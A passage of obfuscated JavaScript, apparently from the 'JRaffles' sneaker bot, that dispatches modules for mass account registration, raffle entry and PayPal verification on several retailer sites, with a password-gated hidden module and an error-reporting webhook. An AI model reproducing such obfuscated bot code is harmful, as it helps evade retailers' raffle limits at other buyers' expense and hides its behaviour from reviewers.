                            if (_0x8b6437[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x28a068(_0x8b6437[taskModule]['modules']);
                                var _0x51d503 = _0x8b6437[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x47729f = await _0x405a82(), _0x1daf58 = await _0x340277();
                                    console['log']('Starting\x20' + _0x298364['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x45d71c = 0x0; _0x45d71c < _0x1daf58['length']; _0x45d71c++) {
                                        console['log'](_0xfa2bb1() + '\x20[' + _0x51d503['name'] + ']\x20Task\x20' + (_0x45d71c + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x2015d0(_0x45d71c, 'nor', _0x51d503, _0x1daf58, _0x47729f);
                                        } catch (_0x1f9c2f) {
                                            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x51d503['name'] + ']\x20Task\x20' + (_0x45d71c + 0x1) + ':\x20Task\x20failed\x20' + _0x1f9c2f));
                                        }
                                        console['log'](_0xfa2bb1() + '\x20[' + _0x51d503['name'] + ']\x20Sleeping\x20for\x20' + _0x152d8a['delay'] + '\x20ms'), await _0xfe9813(_0x152d8a['delay']);
                                    }
                                    return _0x1c6993();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x47729f = await _0x405a82();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), linksRaw = await _0x105f1c(), _0x46d922 = linksRaw['split'](';'), console['log'](_0x46d922['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x45d71c = 0x0; _0x45d71c < _0x46d922['length']; _0x45d71c++) {
                                            try {
                                                _0x51d503['url'] = _0x46d922[_0x45d71c], console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x45d71c + 0x1) + ':\x20Getting\x20Session'), await _0x2015d0(_0x45d71c, 'ver', _0x51d503, null, _0x47729f), console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x152d8a['verificationDelay'] + '\x20ms'), await _0xfe9813(_0x152d8a['verificationDelay']);
                                            } catch (_0x39f6c9) {
                                                console['log'](_0x39f6c9), await _0xfe9813(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x1c6993();
                                    }
                                }
                                ;
                            } else {
                                if (_0x8b6437[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x28a068(_0x8b6437[taskModule]['modules']);
                                    var _0x51d503 = _0x8b6437[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0xaf4157('https://bouncewear.com/nl/account/register', _0x51d503);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x8b6437[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x28a068(_0x8b6437[taskModule]['modules']);
                                        var _0x51d503 = _0x8b6437[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x47729f = await _0x405a82(), _0x365138 = await _0x340277();
                                            return await _0x35d4d9('https://patta.nl/account/register', _0x51d503, _0x365138, _0x47729f), _0x1c6993();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x47729f = await _0x405a82(), _0x365138 = await _0x340277();
                                                return await _0x3f40c4('', _0x51d503, _0x365138, _0x47729f), _0x1c6993();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x8b6437[taskModule]['name'] == 'SLAMJAM') {
                                            taskFunction = await _0x28a068(_0x8b6437[taskModule]['modules']);
                                            var _0x51d503 = _0x8b6437[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x47729f = await _0x405a82(), _0x429805 = await _0x340277();
                                                return await _0x9f830d('https://slamjam.nl/account/register', _0x51d503, _0x429805, _0x47729f), _0x1c6993();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x47729f = await _0x405a82(), _0x429805 = await _0x340277();
                                                    return await _0x4d121f('', _0x51d503, _0x429805, _0x47729f), _0x1c6993();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x8b6437[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x28a068(_0x8b6437[taskModule]['modules']);
                                                var _0x51d503 = _0x8b6437[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x47729f = await _0x405a82(), _0x11951c = await _0x340277();
                                                    return await _0x23039d('https://www.kickz.com/nl/login/', _0x51d503, _0x11951c, _0x47729f), _0x1c6993();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x47729f = await _0x405a82(), _0x11951c = await _0x340277();
                                                        return await _0x300e13(_0x51d503, _0x11951c, _0x47729f), _0x1c6993();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x8b6437[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x28a068(_0x8b6437[taskModule]['modules']);
                                                    var _0x51d503 = _0x8b6437[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x47729f = await _0x405a82(), _0xe2ef92 = await _0x340277();
                                                        return await _0x2ffac0(_0x51d503, _0xe2ef92, _0x47729f), _0x1c6993();
                                                    }
                                                } else {
                                                    if (_0x8b6437[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0xfe9813(0x3e8), _0x1c6993();
                                                    else {
                                                        if (_0x8b6437[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x5818f7 = _0x8b6437[taskModule]['name'];
                                                            const _0x5b346b = await _0x105f1c();
                                                            var _0x46d922 = _0x5b346b['split'](';');
                                                            await _0x287507(_0x46d922, _0x5818f7);
                                                        } else {
                                                            if (_0x8b6437[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x88ce54 = 0x0;
                                                                for (const _0x3dd93e in _0x152d8a) {
                                                                    console['log']('(' + _0x88ce54 + ')\x20' + _0x3dd93e + '\x20:\x20' + _0x152d8a[_0x3dd93e]), _0x88ce54++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x88ce54 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x148652 = await _0x1a352c();
                                                                if (_0x148652 == _0x88ce54)
                                                                    return _0x1c6993();
                                                                console['clear'];
                                                                var _0x291aa6 = 0x0;
                                                                for (var _0x678fe6 in _0x152d8a) {
                                                                    if (_0x148652 == _0x291aa6) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x678fe6 + '\x20:'), _0x152d8a[_0x678fe6] = await _0x5026c7(), _0x9cc7aa['writeFileSync']('../settings.json', JSON['stringify'](_0x152d8a));
                                                                        break;
                                                                    } else
                                                                        _0x291aa6++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0xfe9813(0xbb8), _0x1c6993();
                                                            } else {
                                                                if (_0x8b6437[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x5c87a9(), _0x1c6993();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x8b6437[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x300e39 = await _0x3862f2();
                                                                        _0x300e39 == 'ModuleVoorDeBoys' ? (await _0x560b3f(), await _0x2a8cb1(), await afewFunction(_0x163646[_0x13d975], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0xfe9813(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x1c6993();
        } catch (_0x43a247) {
            return console['log'](_0x43a247), await _0xfe9813(0x3a98);
        }
}
;
_0x193d7e('JRaffles\x20' + _0x112c11), _0x5c87a9();
try {
    _0x2f66c0();
} catch (_0x461e0e) {
    var _0x25e468 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x550f31
            },
            {
                'name': 'Version',
                'value': '' + _0x112c11
            },
            {
                'name': 'Error',
                'value': '' + _0x461e0e
            }
        ]
    }];
    const _0x41b266 = { 'embeds': _0x25e468 };
    _0x3acacc(_0x2c49ed, _0x41b266);
}